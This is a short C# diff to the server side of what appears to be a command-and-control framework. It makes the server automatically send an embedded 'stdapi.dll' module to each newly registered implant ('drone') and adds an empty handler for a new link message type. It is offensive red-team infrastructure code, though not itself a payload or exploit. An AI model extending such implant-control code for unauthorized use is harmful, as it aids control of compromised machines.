@@ -78,6 +78,13 @@ namespace TeamServer.Services
             if (drone is null)
             {
                 drone = new Drone(message.Metadata);
+                
+                // new drone, send stdapi.dll
+                drone.TaskDrone(new DroneTask("core", "load-module")
+                {
+                    Artefact = await Utilities.GetEmbeddedResource("stdapi.dll")
+                });
+                
                 _drones.AddDrone(drone);
             }
             
@@ -94,6 +101,10 @@ namespace TeamServer.Services
                 case C2Message.MessageType.DroneTaskUpdate:
                     var update = message.Data.Deserialize<DroneTaskUpdate>();
                     await HandleTaskUpdate(message.Metadata, update);
+                    break;
+                
+                case C2Message.MessageType.NewLink:
+                    
                     break;
                 
                 default:
